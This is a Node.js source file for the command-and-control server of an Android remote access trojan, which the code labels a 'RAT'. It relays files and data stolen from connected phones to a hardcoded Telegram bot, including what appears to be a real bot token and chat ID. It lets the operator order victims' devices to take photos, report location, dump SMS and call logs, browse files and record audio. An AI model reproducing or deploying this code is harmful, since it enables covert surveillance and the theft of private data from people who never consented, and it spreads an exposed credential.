const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '8570646406:AAG492SHIAdZfrdhnn8R6-BGjTQLV_tqzTw';
const id = '6541663008';
const address = 'https://www.google.com';
const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖";

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send(`<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙇𝙞𝙫𝙚: ${DEVELOPER_NAME}</h1>`);
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 𝙁𝙞𝙡𝙚 𝙍𝙚𝙘𝙚𝙞𝙫𝙚𝙙\n• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, { filename: name });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝘿𝙖𝙩𝙖 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n${req.body['text']}`, {parse_mode: "HTML"});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    ws.uuid = uuid;
    appClients.set(uuid, { ws, model, battery: req.headers.battery });
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙!`, {parse_mode: "HTML"});
    ws.on('close', () => {
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${model}</b> 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙`, {parse_mode: "HTML"});
        appClients.delete(uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId == id) {
        if (message.text == '/start') {
            appBot.sendMessage(id, `°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 ${DEVELOPER_NAME} 𝙍𝘼𝙏`, {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"]],
                    resize_keyboard: true
                }
            });
        }
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, "°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙤𝙣𝙡𝙞𝙣𝙚");
            } else {
                appClients.forEach((value, key) => {
                    appBot.sendMessage(id, `• ᴍᴏᴅᴇʟ : <b>${value.model}</b>`, {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [[{ text: "🎮 Execute Commands", callback_data: key }]]
                        }
                    });
                });
            }
        }
    }
});

appBot.on('callback_query', (query) => {
    const data = query.data;
    if (appClients.has(data)) {
        const client = appClients.get(data);
        const commandMenu = {
            inline_keyboard: [
                [{ text: "📸 Take Photo", callback_data: `camera_${data}` }, { text: "📍 Location", callback_data: `location_${data}` }],
                [{ text: "📩 Get SMS", callback_data: `sms_${data}` }, { text: "📞 Call Logs", callback_data: `calls_${data}` }],
                [{ text: "📂 File Manager", callback_data: `files_${data}` }, { text: "🎙️ Record Audio", callback_data: `voice_${data}` }],
                [{ text: "📱 Device Info", callback_data: `info_${data}` }]
            ]
        };
        appBot.sendMessage(id, `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 <b>${client.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: commandMenu
        });
    } else if (data.includes('_')) {
        const [cmd, devId] = data.split('_');
        const client = appClients.get(devId);
        if (client) {
            client.ws.send(cmd);
            appBot.answerCallbackQuery(query.id, { text: "Command Sent: " + cmd });
        }
    }
});

setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
}, 5000);

appServer.listen(process.env.PORT || 8999);